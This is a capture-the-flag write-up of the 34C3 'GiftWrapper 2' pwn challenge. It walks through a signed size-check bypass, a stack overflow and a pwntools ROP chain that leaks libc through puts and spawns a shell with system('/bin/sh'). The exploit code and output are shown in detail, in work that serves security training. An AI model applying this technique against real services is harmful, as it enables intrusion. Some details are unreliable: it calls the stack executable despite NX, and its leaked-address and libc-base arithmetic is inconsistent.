+++
title = "34C3 CTF: GiftWrapper 2 (pwn)"
date = "2018-01-21T09:21:10+01:00"
tags = ["writeup", "ctf", "pwn", "rop"]
categories = ["writeup", "pwn"]
comments = true
highlight = true
draft = false
index = true
+++

In this challenge we are given a service IP and PORT, to which we can connect using `netcat` or any similar tool. We are also provided with a `tar` file that contains the service binary and some `.so` modules.

<!--more-->

The task description is the following:

> Wrapping gifts is now even more fun! Gift Wrapping Factory 2.0:
> 
> `nc 35.198.185.193 1341`
>
> [Challenge files](/ctf-files/34c3-ctf-2017/giftwrapper2-c653b099aa9bc1b014e5f73008a7e3552387105d.tar)

After extracting the `tar` file we get this:

```shell
$ ls -la
total 3928
drwxr-xr-x  9 segflow  staff      288 Jan 21 09:34 .
drwxr-xr-x  8 segflow  staff      256 Jan  3 13:52 ..
-rwxr-xr-x  1 segflow  staff     8120 Dec 27 21:22 giftwrapper2.so
-rwxr-xr-x  1 segflow  staff  1960656 Oct 11 21:21 libc-2.26.so
-rwxr-xr-x  1 segflow  staff    14456 Dec 27 21:22 server
-rw-r--r--  1 segflow  staff     6024 Dec 27 19:13 server.c
```

`server` is the challenge binary, `server.c` is its code. `libc-2.26.so` is the libc library used by the server.

Before understanding the code or the purpose of `giftwrapper2.so` file, let's try to interact with the service to get an overall understanding what it's doing. Since the CTF server went down after the competition, we will run the server locally and interact with it.

```shell
$ nc localhost 12345
*
* Gift Wrapping Factory
*
Welcome to the new gift wrapping service!
Type "help" for help :)
> help
wrap 				(Wrap a gift)
help 				(Show this information)
modinfo 			(Show information about the loaded module)
> 
```

A menu is shown, and we can print the `help` message, `wrap` a gift and print some info using the `modinfo` command.


```shell
> help
wrap 				(Wrap a gift)
help 				(Show this information)
modinfo 			(Show information about the loaded module)
> modinfo
************************************
Information about the loaded module:
Name: Gift Wrapping Factory
Base address: 0x7f770a712000
************************************
> wrap
What is the size of the gift you want to wrap?
 |> 10
Please send me your gift.
 |> TEST GIFT
         _   _
        ((\o/))
 .-------//^\\------.
 |      /`   `\     |
 |                  |
 | TEST GIFT        |
 |                  |
  ------------------

Wow! This looks so beautiful
> 
```

The `modinfo` command print some info about loaded module and it's base address. Probably this is about the `giftwrapper2.so` found in the challenge files.

The `wrap` command asks as about the size of the gift and the gift content, after that a nice ascii art is shown containing the gift message.

Since the gift message is printed back to us, I thought it will be a good idea to test if there is a `format string` vulnerability. Turns out there wasn't.

```shell
> wrap
What is the size of the gift you want to wrap?
 |> 10
Please send me your gift.
 |> %d
         _   _
        ((\o/))
 .-------//^\\------.
 |      /`   `\     |
 |                  |
 | %d               |
 |                  |
  ------------------

Wow! This looks so beautiful
> 
```

Now let's see what happen if the gift message is longer then the size we typed.

```shell
> wrap
What is the size of the gift you want to wrap?
 |> 2
Please send me your gift.
 |> ABCDEFGHIJKLM
         _   _
        ((\o/))
 .-------//^\\------.
 |      /`   `\     |
 |                  |
 | ABC              |
 |                  |
  ------------------

Wow! This looks so beautiful
> wrap
What is the size of the gift you want to wrap?
 |> 10000
Sorry! This gift is too large.
> 
```

Humm it gets truncated, we are also not allowed to have very big gift messages. So probably the size field is controlled (is it?). 

Now that we understand what the server is doing, let's check the source file.

The server code found in `server.c` is very straightforward,

- Setup a socket
- Load module
- Enter  the regular `accept -> fork -> drop_priv -> interact` loop

The `interact` function securely reads data from the user, and then calls `handle_input` which executes the corresponding command based on the user input.

`load_module` is as follow :

```cpp
void load_module() {
    char* error;
    void* handle = dlopen(LIB, RTLD_LAZY);
    if (!handle) {
        logf("Error on dlopen %s: %s\n", LIB, dlerror());
        exit(EXIT_FAILURE);
    }
    dlerror();
    struct link_map* lm = (struct link_map*) handle;
    module.base = lm->l_addr;

    initialize_module = dlsym(handle, "initialize_module");
    printf("%p\n", initialize_module);
    if ((error = dlerror()) != NULL)  {
        logf("%s\n", error);
        exit(1);
    }
    initialize_module(&module, register_command);

    register_command("help", "\t\t\t", "Show this information", help);
    register_command("modinfo", "\t\t", "Show information about the loaded module", module_info);
    logf("Module successfully loaded.\n");
}
```

Mainly it loads the `giftwrapper2.so` module, calls `initialize_module` within that module and pass the `register_command` as the second argument. After that it registers two commands `help` and `modinfo`.

So probably the `wrap` command is registered by the module itself.

Now it's time to reverse engineer the `giftwrapper2.so` module and hopefully find a flaw there. For this task, I used Binary Ninja, the symbols were not stripped so it's easy to spot the `wrap` function and disassemble it. 

{{< figure src="/img/34c3-ctf-2017/giftwrapper2-binja-wrap.png" width="100%" >}}
<br/>
The logic behind this function is the following:

- Read the size from user and store it into a buffer
    - If the read fails -> exit
- Call `strtol` to convert the size into a number.
    - If the size is above 99 -> print error message and exit the function
    - Else, use the `read` function and pass the size to it's argument in order to read up to `size` bytes.

Even though it sounds secure, it's not. The flaw is within is block, can you spot it?
```asm
0x855: lea rdi, rsp + 0x65
0x85a: mov edx, 0
0x85f: mov esi, 0
0x864: call strtol         ; convert size to long
0x869: mov rbp, rax
0x86c: cmp ax, 0x63        ; compare size with 0x63 (99 in decimal)
0x870: jg 0x94c            ; jump to 0x94c if greater
```

The conditional jump is done using the `jg` instruction which is used for **signed** comparison. Check this nice page to better understand [x86-jumps](http://unixwiz.net/techtips/x86-jumps.html). But the `read` function interpret it's argument as an unsigned integer, which mean if, when prompted for the size, we type `-1` (**0xffffffff** in hex) we can bypass the check against **0x63**. This is possible because **0xffffffff < 0x63** when they are interpreted as unsigned numbers. 

Later when we reach the `read` function, **0xffffffff** is interpreted as an unsigned number so it's possible to read up to `4GB` of data. 

Using this we probably can write over the buffer boundaries and occur an overflow. To verify this hypothesis let's try to crash the binary.

```shell
$ nc 0 12345
*
* Gift Wrapping Factory
*
Welcome to the new gift wrapping service!
Type "help" for help :)
> wrap
What is the size of the gift you want to wrap?
 |> -1
Please send me your gift.
 |> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
         _   _
        ((\o/))
 .-------//^\\------.
 |      /`   `\     |
 |                  |
 |                  |
  ------------------

Wow! This looks so beautiful

$ 
```

Great instead of printing the prompt again, the connection immediately exit after printing the ascii art, this mean we probably did overwrite the return address stored in the stack.

Using `rabin2` from the [radare2](http://rada.re/r/) suite, we can get some info from the binary:
```shell
$ rabin2 -I server
arch     x86
binsz    12597
bintype  elf
bits     64
canary   false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
$ 
```

Great no [stack canary](https://en.wikipedia.org/wiki/Stack_buffer_overflow), but the stack is not executable ([NX Bit](https://en.wikipedia.org/wiki/NX_bit) enabled). 

The next step is to know from what offset we start controlling the instruction pointer **rip**, we can do this manually but trying different lengths, but we can also use `ragg2` to generate a [Debruijn sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) and calculate the exact offset after the crash. 

The size of wrap's stack frame is **0x70** (112 in decimal), so let's generate a sequence slightly greater than 112

```shell
$ ragg2 -r -P 140
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuA
$ 
```

Now we can either attach the server to a debugger, configure it to follow child processes, and wait for it to crash so we can get the value of `rip` register and calculate the offset, or simple use `dmesg` command to print info about the last crashes happened in our system. Since I'am lazy, I went for the second approach.


```shell
$ nc 0 12345
*
* Gift Wrapping Factory
*
Welcome to the new gift wrapping service!
Type "help" for help :)
> -1
Command not found.
> wrap
What is the size of the gift you want to wrap?
 |> -1
Please send me your gift.
 |> AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2
         _   _
        ((\o/))
 .-------//^\\------.
 |      /`   `\     |
 |                  |
 |                  |
  ------------------

Wow! This looks so beautiful

$ sudo dmesg | tail
[ 6285.218361] clocksource: Switched to clocksource hpet
[13404.975546] server[2981]: segfault at 41754141 ip `0000000041754141` sp 00007fff8cbed360 error 14 in libnss_files-2.25.so[7f7709ed4000+b000]
$ 
```

Great, at the moment of crash, the instruction pointer was pointing to **0x41754141**. Again using `ragg2` we can calculate the offset.

```shell
$ ragg2 -q 0x41754141
Little endian: 136
Big endian: 137
$ 
```

From `rabin2` output, we already know that the binary's [endianess](https://en.wikipedia.org/wiki/Endianness) is Little Endian, so the offset value is **136**.

At this step we know that we control the instruction pointer, we also know that the stack is executable. One way to exploit this is to [return to libc](https://en.wikipedia.org/wiki/Return-to-libc_attack), but since we don't know at what address `libc` is linked, we need to leak some addresses. 

Using [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) we can read from anywhere, this is done because the function `puts` actually prints bytes from the addresse pointed by `rdi` register. So by chaining 
`pop rdi` and `call puts` gadgets we can mount a read-anywhere attack. In order to calculate `libc` base address we need to read the address of any symbol from it. Reading any symbol from the [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) table allows us to leak addresses from `libc`, one good condidate is puts' entry in `GOT`, to get it's address we can use `objdump -R`:

```shell
$ objdump -R server
server:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE
...
0x00000000602018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
...
$ 
```

Now we only need a `pop rdi` gadget. By using `radare2` we can get that, below we see that radare2 found two `pop rdi` gadgets:
```shell
$ radare2 server
[0x00400dc0]> /Rl pop rdi
0x00401550: pop rdi; ret;
0x004015c3: pop rdi; ret;
[0x00400dc0]> 
```

The following python code connect to server, interact with it and then send our rop chain. I'am using [Pwntools](https://github.com/Gallopsled/pwntools) to do this, since it make network programming much more easy and funny.

```python
from pwn import *

r = remote('localhost', 12345)
pop_rdi = 0x00401550
puts_got = 0x602018
call_puts = 0x0040122f

rop = p64(pop_rdi)
rop += p64(puts_got)
rop += p64(call_puts)

payload = "A" * 136  # fill the buffer
payload += rop       # Append our rop chain

r.sendlineafter("> ", "wrap")  # Send the wrap command
r.sendlineafter("|> ", "-1")  # set the size to -1
r.sendlineafter("|> ", payload)  # send the payload

# Get the last sended line, this contain raw data read from *puts_got
r.recvuntil("Wow! This looks so beautiful\n")  # recv the data
data = r.recvline().strip()
print(repr(data)) # print raw data so we can verify

# Pad the address to 8 bytes so we can unpack it
pad = "\x00" * (8 - len(data))
addr = data + pad

# Unpack the addr
puts_absolute = u64(addr)
print "puts is at", hex(puts_absolute)
```

```shell
$ python giftwrapper2_exploit.py
[..] Opening connection to localhost on port 12345: Trying 127.0.0.1
New connection from 127.0.0.1 on port 40450
[+] Opening connection to localhost on port 12345: Done
127.0.0.1:40450 disconnected
'`\xc1\x07\xa0\xeb\x7f'
puts is at 0x7feba007c460
```

Now we know that the absolute address of `puts` is **0x7feba007c460**, and since we have the libc used by the server we can know puts' offset within that libc, we just need to open `libc-2.26.so` using binary ninja (or radare2 and use the `is` command) and navigste to `puts` function:

{{< figure src="/img/34c3-ctf-2017/giftwrapper2-binja-puts.png" class="text-center" >}}
<br/>

Here it shows that puts' offset within libc is **0x78460**, given this we can calculate libc base address.

> libc_base = puts absolute address - puts relative offset
> 
> libc_base = **0x7feba007c160** - **0x78460** = **0x7feba0004000**


By having the libc base address we can get the absolute of any symbol within it, so now we just need to call `system("/bin/sh")` and have our flag.

Again using binary ninja we can get the offset of `system` as well as the string `/bin/sh`. <br>Argument for `system` are passed via `rdi` register, so just before jumping to it we need to load rdi with the address of `/bin/sh`. 

We already have a `pop rdi` gadget so this should be easy now. The final exploit is the following:

{{< gist segflow 65ed5e55ad83ce9b5cf4aec9c0bc3ced >}}

```shell
> $ python giftwrapper2_exploit.py
[/.......] Opening connection to localhost on port 12345: Trying 127.0.0.1
New connection from 127.0.0.1 on port 40450
[+] Opening connection to localhost on port 12345: Done
127.0.0.1:40450 disconnected
'`\xc1\x07\xa0\xeb\x7f'
puts is at 0x7feba007c160
libc is at 0x7feba0012000
system is at 0x7feba0052d60
/bin/sh is at 0x7feba017a917
[*] Closed connection to localhost port 12345
[▁] Opening connection to localhost on port 12345: Trying 127.0.0.1
New connection from 127.0.0.1 on port 40452
[+] Opening connection to localhost on port 12345: Done
[*] Switching to interactive mode
         _   _
        ((\o/))
 .-------//^\\------.
 |      /`   `\     |
 |                  |
 |                  |
  ------------------

Wow! This looks so beautiful
$ id
uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
$ cat flag.txt
34C3_r0p_wr4pP3d_g1fts_ar3_tH3_b3st_g1fts
$ 
```

Flag: **34C3_r0p_wr4pP3d_g1fts_ar3_tH3_b3st_g1fts**